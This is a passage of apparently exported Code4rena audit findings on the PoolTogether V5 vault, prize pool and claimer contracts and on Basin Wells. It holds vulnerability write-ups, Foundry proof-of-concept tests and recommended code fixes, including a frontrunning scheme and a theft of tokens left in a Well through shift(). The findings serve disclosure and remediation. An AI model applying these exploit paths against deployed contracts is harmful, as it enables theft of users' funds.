include the current round when claiming prizes", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/150", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-21"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L366 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L421 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L903-L908   # Vulnerability details  ## Impact When claiming prizes, the higher the contribution percentage of the given vault, the higher the odds of a user contributing to that vault receiving a prize. Because the vault contributions are wrongly calculated, a vault gets credit for distributions that haven't actually been made yet. A vault can swing the odds in its favour by contributing prize tokens to the prize pool in a recent round before claiming prizes (based on a normal value of alpha). The is particularly important when considering prize tiers that occur frequently (the highest tiers).  ## Proof of Concept A draw is closed by the draw manager by calling `closeDraw`. During this process, new liquidity is distributed among the tiers to be available for prize claims:  ``` _nextDraw(_nextNumberOfTiers, uint96(_contributionsForDraw(lastClosedDrawId + 1))); ```  In the above line the contributions are calculated based on `lastClosedDrawId + 1` because `lastClosedDrawId` has not yet been incremented. It is incremented at the end of the `_nextDraw` method.  A prize is claimed when a vault calls (via a claimer) `claimPrize`. In this process the contribution percentage of the vault is calculated because it affects the winning region (i.e. odds) for a user:  ``` (SD59x18 _vaultPortion, SD59x18 _tierOdds, uint16 _drawDuration) = _computeVaultTierDetails(       msg.sender,       _tier,       numberOfTiers,       lastClosedDrawId     ); ```  As can be seen above, the vault portion is calculated based on `lastClosedDrawId` which is the value which was incremented when closing the draw previously. This method makes the following underlying call:  ``` vaultPortion = _getVaultPortion(       _vault,       uint16(drawDuration > _lastClosedDrawId ? 0 : _lastClosedDrawId - drawDuration + 1),       _lastClosedDrawId + 1,       smoothing.intoSD59x18()     ); ```  This calculates the value dispersed between a start and end draw INCLUSIVE. Therefore, this is actually calculating the vault contributions based on the current in-progress round as well that hasn't yet been dispersed to the tiers. In fact, it also wrongly increments the start round id as well.  ## Tools Used Manual review  ## Recommended Mitigation Steps The `_computeVaultTierDetails` method should not increment the start and end draw ids:  ``` diff --git a/src/PrizePool.sol b/src/PrizePool.sol index a42a27e..34548c9 100644 --- a/src/PrizePool.sol +++ b/src/PrizePool.sol @@ -902,8 +902,8 @@ contract PrizePool is TieredLiquidityDistributor {      drawDuration = uint16(TierCalculationLib.estimatePrizeFrequencyInDraws(tierOdds));      vaultPortion = _getVaultPortion(        _vault, -      uint16(drawDuration > _lastClosedDrawId ? 0 : _lastClosedDrawId - drawDuration + 1), -      _lastClosedDrawId + 1, +      uint16(drawDuration > _lastClosedDrawId ? 0 : _lastClosedDrawId - drawDuration), +      _lastClosedDrawId,        smoothing.intoSD59x18()      );    } ```   ## Assessed type  Math"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/146", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-29"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "Loss of precision leads to undercollateralized", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/143", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-22"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1176   # Vulnerability details  ## Impact Since `_yieldVault` mostly calculates `shares` use `round down` when depositing, there is often a `1 wei` loss of precision, which can cause the `vault` to go into `undercollateralized` mode by mistake.  ## Proof of Concept When a user deposits an asset, we update `_lastRecordedExchangeRate`, the calculation is done by this method `_currentExchangeRate()`  The code is as follows:  ```solidity   function _currentExchangeRate() internal view returns (uint256) {     uint256 _totalSupplyAmount = _totalSupply();     uint256 _totalSupplyToAssets = _convertToAssets(       _totalSupplyAmount,       _lastRecordedExchangeRate,       Math.Rounding.Down     );  @>  uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));      if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }      if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }      return _assetUnit;   } ```  This method takes `_yieldVault.maxWithdraw(address(this))` as the maximum value to calculate the current exchange rate.  If the exchange rate is lower than `_assetUnit`, then it goes into `undercollateralized` mode, where it can only be withdraw, not deposit.  So if `_yieldVault` is losing money, it goes into `undercollateralized`.  But there is one missing consideration here: As long as `_yieldVault` is not exclusive, there will be precision loss issues, after `_yieldVault.deposit()`, `maxWithdraw()` will lose precision, because most vaults will do `rounds down` shares calculations For example: depositing `1000000000`, but it can only withdraw `999999999`.  This leads to the problem that when the first deposit is made, it is likely to go into `undercollateralized` mode immediately due to the `1 wei` loss.  The following code demonstrates that when a non-exclusive `_yieldVault`, `alice` is first deposited normally, it immediately enters `undercollateralized` mode.  add to Deposit.t.sol  ```solidity   function testLossPrecision() external {     vm.startPrank(alice);          //0.Constructing a yieldVault that is already profitable     uint256 _amount = 333e18;     underlyingAsset.mint(alice, _amount);     underlyingAsset.approve(address(yieldVault), type(uint256).max);        yieldVault.deposit(_amount,alice);     //profitable 0.1e18     underlyingAsset.mint(address(yieldVault), 0.1e18);      //1.alice deposit     _amount = 100e18;     underlyingAsset.mint(alice, _amount);     underlyingAsset.approve(address(vault), type(uint256).max);     console2.log(\"deposit:\",_amount);         vault.deposit(_amount, alice);     console2.log(\"maxWithdraw:\",yieldVault.maxWithdraw(address(vault)));     console2.log(\"loss :\",_amount - yieldVault.maxWithdraw(address(vault)));     console2.log(\"isVaultCollateralized:\",vault.isVaultCollateralized());       return;    } ```  ```console $ forge test --match-test testLossPrecision -vvv  [PASS] testLossPrecision() (gas: 402881) Logs:   deposit: 100000000000000000000   maxWithdraw: 99999999999999999999   loss : 1   isVaultCollateralized: false  ```   This small loss of precision should not be treated as a loss, and we can avoid it by adding `1wei` when calculation exchange rate.  ## Tools Used  ## Recommended Mitigation Steps   `_yieldVault.maxWithdraw() + 1` Avoid loss of precision into `undercollateralized`   ```solidity   function _currentExchangeRate() internal view returns (uint256) {     uint256 _totalSupplyAmount = _totalSupply();     uint256 _totalSupplyToAssets = _convertToAssets(       _totalSupplyAmount,       _lastRecordedExchangeRate,       Math.Rounding.Down     );  -   uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this)); +   uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this)) + 1;      if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }      if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }      return _assetUnit;   } ```   ## Assessed type  Decimal"}, {"title": "Vault does not conform to ERC4626", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-23"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L375-L377 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L383-L385   # Vulnerability details  ## Impact `Vault` does not conform to ERC4626 which may break external integrations  ## Proof of Concept The [ERC4626 specification](https://eips.ethereum.org/EIPS/eip-4626) states that `maxDeposit` *MUST return the maximum amount of assets `deposit` would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted*.   Similarly, `maxMint` *MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted.*  The PoolTogether V5 `Vault` connects to an external ERC4626-compliant Vault (`_yieldVault`) and deposits incoming assets in it. This means that `maxDeposit` and `maxMint` of the PoolTogether Vault must be constrained by the `maxDeposit` and `maxMint` of the external Vault.  ## Tools Used Manual review, [ERC-4626: Tokenized Vaults](https://eips.ethereum.org/EIPS/eip-4626)  ## Recommended Mitigation Steps Replace the implementation of `maxDeposit` ```   function maxDeposit(address) public view virtual override returns (uint256) {     return _isVaultCollateralized() ? type(uint96).max : 0;   } ```  with: ```   function maxDeposit(address receiver) public view virtual override returns (uint256) {     if (!_isVaultCollateralized()) return 0;      uint256 yvMaxDeposit = _yieldVault.maxDeposit(receiver);     return yvMaxDeposit < type(uint96).max ? yvMaxDeposit : type(uint96).max;   } ```  Analogously, change the implementation of `maxMint` from ```   function maxMint(address) public view virtual override returns (uint256) {     return _isVaultCollateralized() ? type(uint96).max : 0;   } ``` to: ```   function maxMint(address receiver) public view virtual override returns (uint256) {     if(!_isVaultCollateralized()) return 0;      uint256 yvMaxMint = _yieldVault.maxDeposit(receiver);     return yvMaxMint < type(uint96).max ? yvMaxMint : type(uint96).max;   } ```      ## Assessed type  ERC4626"}, {"title": "Claimer.claimPrizes can be frontrunned in order to make losses for the claim bot", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/115", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-24"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L60-L83   # Vulnerability details  ## Impact Claimer.claimPrizes can be frontrunned in order to make losses for the claim bot  ## Proof of Concept All prizes in the system should be claimed during draw period. Anyone can call `claimPrizes` function for any winner and prize. But the idea of protocol is to incentivize claim bots to do all claims instead of users. These should benefit from batching claims together in 1 call.  Also `Claimer` contract is using vrgda which can increase/decrease fee for the claimer, depending of amount of already claimed prizes. That actually means that in case if not enough prizes are claimed in some point of time, then fee will be increased to incentivize more bots.  So as bots will be trying to batch a lot of prize claims together, that means that they will spent a lot on gas. Malicious actor can see which prizes bot is going to claim and frontrun him with last prize is the list. As result [claiming will fail](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L434-L436) and bot will face losses.  Another reason, why malicious actor can do that is to make vrgda to provide bigger fees. So he can create a bot that will block claims of another bots with big amount of claims in the batch, in order to wait and get better prices and claim those prize by himself and receive fees. ## Tools Used VsCode ## Recommended Mitigation Steps I guess that in case if price is already claimed, then you can return early from the `PrizePool.claimPrize` function and emit some event. In this case bot will not receive fee for already claimed prize and his tx will continue with other prizes in the batch.      ## Assessed type  Error"}, {"title": "depositWithPermit and mintWithPermit are allowed to be called by permit creator only", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/113", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-25"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L435   # Vulnerability details  ## Impact depositWithPermit and mintWithPermit are allowed to be called by permit creator only. No any other contracts will be able to execute these function on behalf of signer.  ## Proof of Concept `depositWithPermit` function allows to provide signed permit in order to receive approve and deposit funds into the vault.  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L427-L437 ```solidity   function depositWithPermit(     uint256 _assets,     address _receiver,     uint256 _deadline,     uint8 _v,     bytes32 _r,     bytes32 _s   ) external returns (uint256) {     _permit(IERC20Permit(asset()), msg.sender, address(this), _assets, _deadline, _v, _r, _s);     return deposit(_assets, _receiver);   } ```  This function calls `_permit` and pass `msg.sender` as `_owner` to that function. https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1093-L1104 ```solidity   function _permit(     IERC20Permit _asset,     address _owner,     address _spender,     uint256 _assets,     uint256 _deadline,     uint8 _v,     bytes32 _r,     bytes32 _s   ) internal {     _asset.permit(_owner, _spender, _assets, _deadline, _v, _r, _s);   } ```  This means that signer can be only the same person that called `depositWithPermit` function.  However the purpose of permit is to allow someone to sign approve signature, so that this signature can be used by another contract to call some function on behalf of signer.  In this case, anyone should be able to sign permit for the vault, and vault should check that `_receiver` is same who signed permit. ## Tools Used VsCode ## Recommended Mitigation Steps Use `_receiver` instead of `msg.sender`. ```solidity   function depositWithPermit(     uint256 _assets,     address _receiver,     uint256 _deadline,     uint8 _v,     bytes32 _r,     bytes32 _s   ) external returns (uint256) {     _permit(IERC20Permit(asset()), _receiver, address(this), _assets, _deadline, _v, _r, _s);     return deposit(_assets, _receiver);   } ```   ## Assessed type  Error"}, {"title": "Transfer of Vault tokens can cause accounting errors in other contracts", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/91", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-26"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1155 https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/TwabLib.sol#L48   # Vulnerability details  `Vault::_transfer` overrides the `ERC20::_transfer` function so that the transfer is performed using the `TwabController` contract. In the implementation `_shares` is downcasted to `uint96` and this can result in an underflow silently.  There are nat spec comments indicating that the balance in `TwapController` is stored in `uint96`, which would mean that there is no real risk of underflow. However, the `TwapController` contract uses `uint112` to store the balance, so the risk of underflow is real.  ```solidity File: TwabLib.sol  47  struct AccountDetails { 48    uint112 balance; // <== not uint96 49    uint112 delegateBalance; 50    uint16 nextObservationIndex; 51    uint16 cardinality; 52  } ```  ## Impact  Integrations of other contracts or protocols with the `Vault` contract may result in accounting errors due to the amount of shares transferred being less than expected due to silent underflow.  ## Proof of Concept  Foundry test:  ```solidity   mapping(address => uint256) userToBalance;    function testTransferUnderflow() external {     vm.startPrank(alice);      uint256 _amount = type(uint112).max;     underlyingAsset.mint(alice, _amount);     underlyingAsset.approve(address(vault), type(uint256).max);      vault.deposit(type(uint96).max, alice);     vault.deposit(type(uint96).max, alice);     vm.stopPrank();     assertEq(vault.balanceOf(alice), uint256(type(uint96).max) * 2);      // Alice has now a balance of type(uint96).max * 2     // Let's imagine some integration of another contract with the Vault contract     // that performs the following operations:      // 1. Alice approves all the Vault shares to the contract     vm.prank(alice);     vault.approve(address(this), type(uint256).max);      // 2. The contract transfers all the Vault shares from Alice and registers them     // in in a mapping     uint256 aliceBalance = vault.balanceOf(alice);     vault.transferFrom(alice, address(this), aliceBalance);     userToBalance[alice] = aliceBalance;      // 3. Only type(uint96).max shares are transfered, but the double of that amount     // is registered as transfer underflows silently. So alice can now transfer the     // remaining balance from the vault.     vm.prank(alice);     vault.transfer(bob, type(uint96).max);   } ```  ## Tools Used  Manual inspection.  ## Recommended Mitigation Steps  Use OpenZeppelin's `SafeCast` library to convert `uint256` to `uint96`.   ## Assessed type  Under/Overflow"}, {"title": "Vault is not compatible with some erc4626 vaults", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/79", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-09"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1168-L1187   # Vulnerability details  ## Impact Vault is not compatible with some erc4626 vaults. Depositors can loose funds.  ## Proof of Concept Anyone can build `Vault` with underlying vault inside, which should earn yields. When user deposits/withdraws then [`_convertToShares` function is used](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L411) to determine amount of shares that user will receive for provided assets amount. This function [calls `_currentExchangeRate`](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L868C29-L868C49) to find out current rate.  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1168-L1187 ```solidity   function _currentExchangeRate() internal view returns (uint256) {     uint256 _totalSupplyAmount = _totalSupply();     uint256 _totalSupplyToAssets = _convertToAssets(       _totalSupplyAmount,       _lastRecordedExchangeRate,       Math.Rounding.Down     );       uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));       if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }       if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }       return _assetUnit;   } ``` As you can see in order to find current exchange rate `_yieldVault.maxWithdraw(address(this))` is used. In case if this value(which is supposed to be full amount of deposits + yields inside `_yieldVault`) is less than `_totalSupplyAmount`(which is total supply * _lastRecordedExchangeRate), then rate will be decreased, which means that vault lost funds and users should receive less when withdraw. Later, this new `_currentExchangeRate` [will be stored as `_lastRecordedExchangeRate`](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1124).  Now when i explained how rate is changed i can explain the problem with some erc4626 vaults.  There are some erc4626 vaults as `DnGmxSeniorVault`, that collect deposited funds and borrow them. When you [call `maxWithdraw` for such vaults](https://github.com/RageTrade/delta-neutral-gmx-vaults/blob/main/contracts/vaults/DnGmxSeniorVault.sol#L417-L431), then in case if not enough funds are present, because of some borrow percentage on vault, then amount returned can be less than real balance of caller. In case if such wrong value is returned, then depositors of Pool vault will face losses as their exchange rate will be less than 1. When `DnGmxSeniorVault` will again have enough balance(when debt is repaid by jn vault), then exchange rate will be 1 again.  Another erc4626 vaults that can create problems are vaults that have withdraw limit. In that case if Pool vault has balance inside yield vault that is bigger than borrow limit, then depositors will face same problem which leads to loose of funds. ## Tools Used VsCode ## Recommended Mitigation Steps You need to consider cases, when some vaults can't be used as yield vaults and aware vault creators about that.      ## Assessed type  Error"}, {"title": "Tiers odds compuations is not accurate", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/75", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-34"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/generationsoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/TierCalculationLib.sol#L26   # Vulnerability details  ## Impact Detailed description of the impact of this finding. Tiers odds compuations is not accurate ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. If you will go to [wolfram link](https://www.wolframalpha.com/input?i=evaluate++e+%5E%28%28t%E2%88%92n%2B1%29%E2%88%97ln%281%2F365%29%2F%281%E2%88%92n%29%29) than [equation for tiers](https://dev.pooltogether.com/protocol/next/design/prize-pool) can be simplified to this  ![image](https://i.ibb.co/0jL26pv/Screenshot-from-2023-07-11-20-36-58.png)  So code for ods will become like this ```solidity   function getTierOdds(     uint8 _tier,     uint8 _numberOfTiers,     uint16 _grandPrizePeriod   ) internal pure returns (SD59x18) {     SD59x18 _k = sd(1).div(sd(int16(_grandPrizePeriod))).ln().div(       sd((-1 * int8(_numberOfTiers) + 1))     );      return E.pow(_k.mul(sd(int8(_tier) - (int8(_numberOfTiers) - 1))));   } // new equation   function getTierOdds2(     uint8 _tier,     uint8 _numberOfTiers,     uint16 _grandPrizePeriod   ) internal pure returns (SD59x18) {      return sd(1).div(sd(int16(_grandPrizePeriod))).pow((sd(int8(_tier) - (int8(_numberOfTiers) - 1))).div(sd((-1 * int8(_numberOfTiers) + 1))));   } ``` [blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/TierCalculationLib.sol#L26](https://github.com/generationsoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/TierCalculationLib.sol#L26)  Here is an example before and after, its not a huge difference. But seems like real tier odds are slightly less than current this means that protocol will give out prize a little bit more than it should. Above is current formula, below for new formula. ```solidity   SD59x18 internal constant TIER_ODDS_1_4 = SD59x18.wrap(19579642462506911);   SD59x18 internal constant TIER_ODDS_1_4 = SD59x18.wrap(19579642462506911);   ----------   SD59x18 internal constant TIER_ODDS_2_4 = SD59x18.wrap(139927275620255366);   SD59x18 internal constant TIER_ODDS_2_4 = SD59x18.wrap(139927275620255364);   ----------   SD59x18 internal constant TIER_ODDS_3_4 = SD59x18.wrap(1000000000000000000);   SD59x18 internal constant TIER_ODDS_3_4 = SD59x18.wrap(1000000000000000000);   ----------   SD59x18 internal constant TIER_ODDS_0_5 = SD59x18.wrap(2739726027397260);   SD59x18 internal constant TIER_ODDS_0_5 = SD59x18.wrap(2739726027397260);   ----------   SD59x18 internal constant TIER_ODDS_1_5 = SD59x18.wrap(11975133168707466);   SD59x18 internal constant TIER_ODDS_1_5 = SD59x18.wrap(11975133168707465);   ----------   SD59x18 internal constant TIER_ODDS_2_5 = SD59x18.wrap(52342392259021369);   SD59x18 internal constant TIER_ODDS_2_5 = SD59x18.wrap(52342392259021367);   ----------   SD59x18 internal constant TIER_ODDS_3_5 = SD59x18.wrap(228784597949733865);   SD59x18 internal constant TIER_ODDS_3_5 = SD59x18.wrap(228784597949733862);  ``` ## Tools Used  ## Recommended Mitigation Steps Fix a tier odds   ## Assessed type  Error"}, {"title": "Inconsistent behavior for canary claims in claimer", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-27"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L76   # Vulnerability details  ## Impact Detailed description of the impact of this finding. Inconsistent behavior for canary claims in claimer  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. Whenever claimer claims prizes he computes fees per claim without considering canary claims ```solidity   function claimPrizes(     Vault vault,     uint8 tier,     address[] calldata winners,     uint32[][] calldata prizeIndices,     address _feeRecipient   ) external returns (uint256 totalFees) {     uint256 claimCount;     for (uint i = 0; i < winners.length; i++) {       claimCount += prizeIndices[i].length;     }      uint96 feePerClaim = uint96(       _computeFeePerClaim(         _computeMaxFee(tier, prizePool.numberOfTiers()),         claimCount,         prizePool.claimCount()       )     );      vault.claimPrizes(tier, winners, prizeIndices, feePerClaim, _feeRecipient);      return feePerClaim * claimCount;   } ``` [src/Claimer.sol#L76](https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L76)  ## Tools Used  ## Recommended Mitigation Steps Consider canary as claim  ```diff     uint96 feePerClaim = uint96(       _computeFeePerClaim(         _computeMaxFee(tier, prizePool.numberOfTiers()),         claimCount, -        prizePool.claimCount() +        prizePool.claimCount() + prizePool.canaryClaimCount()       )     );  ```          ## Assessed type  Error"}, {"title": "Constant Product formula overflowing if number of tokens in reserve is too high", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/286", "labels": ["bug", "downgraded by judge", "grade-a", "low quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L436   # Vulnerability details  ## Impact Line 436 in `Well.sol` calls the function `_calcLpTokenSupply()` is be called by passing the address of the well and the reserves to the `addLiquidty()` function. In the test below you can see that we set the amount of max reserves to be 100. This will cause the test to fail when trying to calculate the LP token supply.   ## Proof of Concept  ``` javascript       //////////// LP TOKEN SUPPLY ////////////      /// @dev calcLpTokenSupply: `n` equal reserves should summate with the token supply     function testLpTokenSupplySmall(uint256 n) public {         vm.assume(n < 100);         vm.assume(n >= 2);         uint256[] memory reserves = new uint256[](n);         for (uint256 i; i < n; ++i) {             reserves[i] = 1;         }         assertEq(_function.calcLpTokenSupply(reserves, _data), 1 * n);     }  ```  ``` javascript      Running 1 test for test/functions/ConstantProduct.t.sol:ConstantProductTest     [FAIL. Reason: Arithmetic over/underflow      Counterexample: calldata=0x2d26b6ad000000000000000000000000000000000000000000000000000000000000004e, args=[78]]      testLpTokenSupplySmall(uint256) (runs: 49, \u03bc: 21546, ~: 15383)     Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.60ms     Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)      Failing tests:     Encountered 1 failing test in test/functions/ConstantProduct.t.sol:ConstantProductTest     [FAIL. Reason: Arithmetic over/underflow Counterexample: calldata=0x2d26b6ad000000000000000000000000000000000000000000000000000000000000004e, args=[78]] testLpTokenSupplySmall(uint256) (runs: 49, \u03bc: 21546, ~: 15383)      Encountered a total of 1 failing tests, 0 tests succeeded  ```  As you can see from the failing test above.LP tokens out will not be able to be calculated if the amount of reserve tokens is too high causing the add liquidity function to revert after a Well contract has been deployed.   ## Tools Used  Foundry manual testing   ## Recommended Mitigation Steps  Though this was expected by the devs it seems to overflow before their expectation with as little as 100 tokens.  The best way to remediate this is to set an upper limit on the number of tokens that can be added to a well.      ## Assessed type  Under/Overflow"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/280", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/0x11singh99-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/273", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-01"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/Raihan-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/266", "labels": ["bug", "G (Gas Optimization)", "grade-b", "high quality report", "sponsor confirmed", "G-03"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/SY_S-G.md)."}, {"title": "Recommended use of shift() is vulnerable to theft of all user's funds", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/264", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-06"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L352   # Vulnerability details  ## Description  In Well, the `shift()` function is used to transfer tokens directly to the next Well instead of the sender. This allows for a cheap sequence of swaps. The documentation states the exact call flow: ``` * 2. Using a router with {shift}: *  WETH.transfer(sender=0xUSER, recipient=Well1)                        [1] *  Call the router, which performs: *      Well1.shift(tokenOut=DAI, recipient=Well2) *          DAI.transfer(sender=Well1, recipient=Well2)                  [2] *      Well2.shift(tokenOut=USDC, recipient=0xUSER) *          USDC.transfer(sender=Well2, recipient=0xUSER)                [3] ```  Notice that there are two separate actions, first (1) transfering the token (WETH) to the Well, and then (2) calling the router's function, which will shift the tokens to a second Well, and finally to the user's balance.  The issue is that between action (1) and (2) a malicious user can use the victim tokens from (1) as their own `amountIn`.  They can call one of the Well functions, like `shift()`, to perform the swap and specify the attacker as `recipient`.   From all the documentation provided and the codebase, the user is led to interact unsafely with the Well's `shift()` call.   ## Impact  Users following the documented action flow can lose their entire input amount.  ## POC  1. User A sends WETH tokens to Well1 2. User A calls the router's multi-Well shift function 3. User B calls `shift(tokenOut, ATTACKER_ADDRESS)` on Well directly. Since (1) and (2) are different user initiated TXs, there is definitely vulnerable time to abuse the extra token balance in Well1.   ## Tools Used  Manual audit   ## Recommended Mitigation Steps  Users should not interact with the Well directly. They should call a router function which will do all the swapping activity end-to-end.   ## Assessed type  MEV"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/261", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-07"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/0xprinc-Q.md)."}, {"title": "Due to slot confusion, reserve amounts in the pump will be corrupted, resulting in wrong oracle values", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/260", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/libraries/LibBytes16.sol#L45 